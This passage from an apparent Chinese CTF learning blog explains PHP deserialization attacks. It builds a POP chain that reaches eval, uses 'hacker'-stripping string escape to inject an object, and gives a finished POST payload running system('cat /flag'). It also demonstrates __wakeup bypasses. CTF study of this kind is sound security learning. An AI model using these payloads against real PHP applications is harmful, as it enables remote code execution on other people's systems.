class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DateFormatter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$timestamp</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>, <span class="variable">$timestamp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserProfile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bio</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$preference</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bio = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;preference = <span class="keyword">new</span> <span class="title class_">DateFormatter</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataSanitizer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">clean</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$raw_user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$raw_bio</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;bio&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$raw_user</span> &amp;&amp; <span class="variable">$raw_bio</span>) &#123;</span><br><span class="line">    <span class="variable">$sec</span> = <span class="keyword">new</span> <span class="title class_">SecurityProvider</span>();</span><br><span class="line">    <span class="variable">$sec</span>-&gt;<span class="title function_ invoke__">verify</span>(<span class="variable">$raw_user</span>);</span><br><span class="line">    <span class="variable">$sec</span>-&gt;<span class="title function_ invoke__">verify</span>(<span class="variable">$raw_bio</span>);</span><br><span class="line">    <span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">UserProfile</span>(<span class="variable">$raw_user</span>, <span class="variable">$raw_bio</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) &gt; <span class="number">4096</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Data too long&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$safe_data</span> = <span class="title class_">DataSanitizer</span>::<span class="title function_ invoke__">clean</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$unserialized</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$safe_data</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$unserialized</span> <span class="keyword">instanceof</span> UserProfile) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Profile loaded for &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$unserialized</span>-&gt;username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上为题目内容，分析完我们应该能看出来哪些是构造pop链所必需的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$formatter</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handler</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handler = <span class="variable">$handler</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;formatter = <span class="keyword">new</span> <span class="title class_">DateFormatter</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>-&gt;handler, <span class="string">&#x27;close&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$mode</span> = <span class="string">&#x27;debug&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$mode</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mode = <span class="variable">$mode</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;mode === <span class="string">&#x27;debug&#x27;</span> &amp;&amp; !<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &lt; <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DateFormatter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$timestamp</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>, <span class="variable">$timestamp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>准确来说就是前两个类，那么我们期望执行的反序列化内容化为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">LogService</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">FileStream</span>();</span><br><span class="line"><span class="variable">$ref</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$refProperty</span> = <span class="variable">$ref</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;handler&#x27;</span>);</span><br><span class="line"><span class="variable">$refProperty</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$refProperty</span>-&gt;<span class="title function_ invoke__">setvalue</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>这段代码所输出的payload是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;LogService&quot;:2:&#123;s:10:&quot;*handler&quot;;O:10:&quot;FileStream&quot;:3:&#123;s:16:&quot;FileStreampath&quot;;N;s:16:&quot;FileStreammode&quot;;N;s:7:&quot;content&quot;;s:20:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;s:12:&quot;*formatter&quot;;O:13:&quot;DateFormatter&quot;:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>那么让我们简单分析一下我们需要做什么：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.传入user和bio的值</span><br><span class="line">2.想办法把我们的期望执行的payload放在序列化字符串里面，也就是$safe_data</span><br></pre></td></tr></table></figure>

<p>那看看其他类的作用是什么：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$raw_user</span> &amp;&amp; <span class="variable">$raw_bio</span>) &#123; <span class="comment">//首先会检测我们传入的参数的值是否存在</span></span><br><span class="line">    <span class="variable">$sec</span> = <span class="keyword">new</span> <span class="title class_">SecurityProvider</span>();</span><br><span class="line">    <span class="variable">$sec</span>-&gt;<span class="title function_ invoke__">verify</span>(<span class="variable">$raw_user</span>);</span><br><span class="line">    <span class="variable">$sec</span>-&gt;<span class="title function_ invoke__">verify</span>(<span class="variable">$raw_bio</span>);  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//其次调用SecurityPrrovider这个类中的verify函数去查看我们传入的参数的值中是否存在..字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">UserProfile</span>(<span class="variable">$raw_user</span>, <span class="variable">$raw_bio</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//接着把我们传入的参数的值赋给新创建的UserPrrofile的username和bio</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//然后序列化这个新创建的对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) &gt; <span class="number">4096</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Data too long&quot;</span>);</span><br><span class="line">    &#125;  <span class="comment">//序列化之后的字符串长度不能超过4096个字符</span></span><br><span class="line">    <span class="variable">$safe_data</span> = <span class="title class_">DataSanitizer</span>::<span class="title function_ invoke__">clean</span>(<span class="variable">$data</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用DataSanitizer中的clean函数对序列化之后的字符串进行删除操作，也就是把序列化字符串中的所有hacker替换为空</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$unserialized</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$safe_data</span>);</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$unserialized</span> <span class="keyword">instanceof</span> UserProfile) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Profile loaded for &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$unserialized</span>-&gt;username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  <span class="comment">//判断反序列化之后的对象是否属于UserProfile类</span></span><br><span class="line"></span><br><span class="line">这里需要注意的是如果我们的反序列化字符串无法构成一个对象的话，会导致结构崩溃，也就是说我们的RCE无法执行，那么我们需要在插入我们期望的payload的同时保证UserProfile结构的完整</span><br></pre></td></tr></table></figure>

<p>假设我传入user&#x3D;1&amp;bio&#x3D;1，那么$data和$safe_data结果分别为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;UserProfile&quot;:3:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:3:&quot;bio&quot;;s:1:&quot;1&quot;;s:10:&quot;preference&quot;;O:13:&quot;DateFormatter&quot;:0:&#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:11:&quot;UserProfile&quot;:3:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:3:&quot;bio&quot;;s:1:&quot;1&quot;;s:10:&quot;preference&quot;;O:13:&quot;DateFormatter&quot;:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但如果我把user的值换为hacker，会造成以下结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;UserProfile&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;hacker&quot;;s:3:&quot;bio&quot;;s:1:&quot;1&quot;;s:10:&quot;preference&quot;;O:13:&quot;DateFormatter&quot;:0:&#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line">O:11:&quot;UserProfile&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;&quot;;s:3:&quot;bio&quot;;s:1:&quot;1&quot;;s:10:&quot;preference&quot;;O:13:&quot;DateFormatter&quot;:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们注意到$safe_data中有一串变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:6:&quot;&quot;;</span><br></pre></td></tr></table></figure>

<p>那么这里就涉及到字符串逃逸的知识了，我们可以在保留UserProfile结构完整性的同时插入我们期望执行的payload，所以我们需要逃逸的部分字符串为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;bio&quot;;s:1xx:</span><br></pre></td></tr></table></figure>

<p>考虑到我们的bio内容为我们的期望payload，那么长度经过计数是三位数，所以我们需要逃逸的字符串长度为</p>
<p>18，刚好是三个hacker的长度，而本来作为展示值的”内容变成了s:6”的闭合符，那么实际上我们的序列化字符串就变成了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;UserProfile&quot;:3:&#123;s:8:&quot;username&quot;;s:18:&quot;xxxxxxxxxxxxxxxxxx&quot;1&quot;;s:10:&quot;preference&quot;;O:13:&quot;DateFormatter&quot;:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后1作为我们可控内容自然就拼接进了这个序列化字符串里面，为了保证我们UserProfile的完整性，我们需要加上如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:3:&quot;bio&quot;;s:1:&quot;1&quot;;s:10:&quot;preference&quot;;</span><br></pre></td></tr></table></figure>

<p><strong>记得在最前面加上;保证序列化字符串的结构，在最后面加上}</strong></p>
<p>所以我们的bio内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;s:3:&quot;bio&quot;;s:1:&quot;1&quot;;s:10:&quot;preference&quot;;O:10:&quot;LogService&quot;:2:&#123;s:10:&quot;%00*%00handler&quot;;O:10:&quot;FileStream&quot;:3:&#123;s:16:&quot;%00FileStream%00path&quot;;s:1:&quot;1&quot;;s:16:&quot;%00FileStream%00mode&quot;;s:5:&quot;debug&quot;;s:7:&quot;content&quot;;s:20:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;s:12:&quot;%00*%00formatter&quot;;O:13:&quot;DateFormatter&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>由于属性的不同：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Protected 属性 ($handler, $formatter)：格式是 \0*\0属性名。例如 *handler 序列化后长度是 10，内容是 %00*%00handler。</span><br><span class="line"></span><br><span class="line">Private 属性 ($path, $mode)：格式是 \0类名\0属性名。例如 FileStream 的 $path 序列化后长度是 16，内容是 %00FileStream%00path。</span><br></pre></td></tr></table></figure>

<p>而我们得到的是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;LogService&quot;:2:&#123;s:10:&quot;*handler&quot;;O:10:&quot;FileStream&quot;:3:&#123;s:16:&quot;FileStreampath&quot;;N;s:16:&quot;FileStreammode&quot;;N;s:7:&quot;content&quot;;s:20:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;s:12:&quot;*formatter&quot;;O:13:&quot;DateFormatter&quot;:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>所以需要修改内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*handler    %00*%00handler</span><br><span class="line">FileStreampath    %00FileStream%00path</span><br><span class="line">FileStreammode    %00FileStream%00mode</span><br><span class="line">*formatter    %00*%00formatter</span><br></pre></td></tr></table></figure>

<p>综上所述：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=hackerhackerhacker&amp;bio=;s:3:&quot;bio&quot;;s:1:&quot;1&quot;;s:10:&quot;preference&quot;;O:10:&quot;LogService&quot;:2:&#123;s:10:&quot;%00*%00handler&quot;;O:10:&quot;FileStream&quot;:3:&#123;s:16:&quot;%00FileStream%00path&quot;;s:1:&quot;1&quot;;s:16:&quot;%00FileStream%00mode&quot;;s:5:&quot;debug&quot;;s:7:&quot;content&quot;;s:20:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;s:12:&quot;%00*%00formatter&quot;;O:13:&quot;DateFormatter&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>那么字符串逃逸减少的重点就在于我们需要将原本的序列化字符串的后面部分内容给作为前一个属性的值，然后在后面构造我们想要反序列化的内容</p>
<h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h2><p>这里学习的是利用fast destruct来绕过</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastdestruct.png" class="" title="fastdestruct">

<h3 id="修改属性值绕过-wakeup"><a href="#修改属性值绕过-wakeup" class="headerlink" title="修改属性值绕过__wakeup()"></a>修改属性值绕过__wakeup()</h3><p>php5&gt;5.6.25  php7&lt;7.0.10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果存在__wakeup()方法，调用unserialize()方法之前会先调用__wakeup()方法，但是序列化字符串中表示对象属性个数的值大于真实属性个数时，就会跳过__wwakeup()的执行</span><br></pre></td></tr></table></figure>

<p>在以下这串代码中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Chesmond = <span class="string">&quot;You Lose!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>这样会正常触发__wakeup()方法的内容</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup2.png" class="" title="wakeup2">

<p>我们输出序列化字符串看到的是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;ZLARYY&quot;:3:&#123;s:6:&quot;xiexie&quot;;N;s:11:&quot;*Chesmond&quot;;N;s:13:&quot;ZLARYYArach&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们把这串序列化字符串属性值修改为4，那么看看还会不会触发__wakeup()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Chesmond = <span class="string">&quot;You Lose!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:6:&quot;ZLARYY&quot;:4:&#123;s:6:&quot;xiexie&quot;;N;s:11:&quot;*Chesmond&quot;;N;s:13:&quot;ZLARYYArach&quot;;N;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup4.png" class="" title="wakeup4">

<p>成功绕过了__wakeup()</p>
<h3 id="破坏序列化字符串结构绕过-wakeup"><a href="#破坏序列化字符串结构绕过-wakeup" class="headerlink" title="破坏序列化字符串结构绕过__wakeup()"></a>破坏序列化字符串结构绕过__wakeup()</h3><p>如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Chesmond = <span class="string">&quot;You Lose!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">illy4</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">illy4</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="keyword">object</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<p>正常情况下这段代码输出序列化字符串内容为：</p>
